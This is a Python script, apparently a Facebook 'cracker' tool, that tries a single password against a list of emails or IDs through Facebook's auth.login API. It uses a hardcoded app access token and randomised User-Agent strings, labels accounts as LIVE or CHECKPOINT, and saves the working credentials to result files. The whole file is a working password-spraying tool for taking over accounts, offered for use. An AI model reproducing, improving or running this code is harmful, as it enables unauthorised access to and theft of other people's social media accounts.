import requests
import os
from colorama import Fore, Back, Style
from random import randint

class EZFacebook:

   def __init__(self):
      
      os.system('clear')
      print(Fore.BLUE+"""
          /|            
     _.._ ||         
   .' .._|||         
   | '    ||  __     
 __| |__  ||/'__ '.      _____                 _             
|__   __| |:/`  '. '    / ____|               | |            
   | |    ||     | |    | |     _ __ __ _  ___| | _____ _ __ 
   | |    ||\    / '    | |    | '__/ _` |/ __| |/ / _ \ '__|
   | |    |/\'..' /      | |____| | | (_| | (__|   <  __/ |   
   | |    '  `'-'`      \_____ |_|  \__,_|\___|_|\_\___|_|   """+Fore.RED+"""V.0"""+Fore.BLUE+"""
   |_|
                     """+Style.RESET_ALL+"""___________________
                     """+Fore.YELLOW+""" Coded By I'm Payz                              
      """+Style.RESET_ALL)
      
      print(Style.DIM + '[!] List ID/Email Facebook ( Ex: list.txt )\n' + Style.RESET_ALL)
      self.lists = input(Fore.CYAN+"[?] Put File ID/Email: "+Style.RESET_ALL)
      with open(self.lists) as fid:
         self.fbid = fid.readlines()
         self.pwd = input(Fore.CYAN+"[?] Input Password: "+Style.RESET_ALL)
         print("\n")
         self.url = "https://api.facebook.com/method/auth.login"
      
    
   def randNumber(self,num):
      range_start = 10**(num-1)
      range_end = (10**num)-1
      return randint(range_start, range_end)
    
    
    
      
   def save_to_file(self,nameFile,x):
      kl = open(nameFile, 'a+')
      kl.write(x)
      kl.close()    
    
      
   def checkFb(self):
   
   
      ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(self.randNumber(2))+"."+str(self.randNumber(1))+"."+str(self.randNumber(4))+"."+str(self.randNumber(3))+" Safari/537.36"
      
      checkPoint2 = "The email address you entered has already been registered, but your account hasn\'t been confirmed yet. You".encode()
      checkPoint = "Your account is temporarily unavailable. Regain access by updating the app or logging in from a mobile or web browser.".encode()
      uncheck = "The email you entered doesn\'t appear to belong to an account. Please check your email address and try again.".encode()
      die = "The password you entered is incorrect. Please try again.".encode()
      
      for emails in self.fbid:
         mail = emails.replace("\n", "")
         
         s = requests.Session()
         payloads = {
         "access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        "email" : mail,
        "password" : self.pwd,
        "locale" : "en_US",
        "format" : "JSON"
         }
         fb = s.post(self.url, data=payloads, headers={'User-Agent':str(ua)})
         
         if checkPoint in fb.content:
            print("[+] "+mail+" | "+self.pwd+" => "+Fore.YELLOW+" [ CHECKPOINT ]"+Style.RESET_ALL)
            self.save_to_file('rezult/checkpoint.txt',mail+'|'+self.pwd+"\n")
         elif die in fb.content:
            pass
         elif uncheck in fb.content:
            pass
         elif checkPoint2 in fb.content:
            print("[+] "+mail+" | "+self.pwd+" => "+Fore.YELLOW+" [ CHECKPOINT ]"+Style.RESET_ALL)
            self.save_to_file('rezult/checkpoint.txt',mail+'|'+self.pwd+"\n")
         else:
            print("[+] "+mail+" | "+self.pwd+" => "+Fore.GREEN+" [ LIVE ]"+Style.RESET_ALL)
            self.save_to_file('rezult/live.txt',mail+'|'+self.pwd+"\n")
         
         
         
         
         
         
         
      
      
check = EZFacebook()
check.checkFb() 
   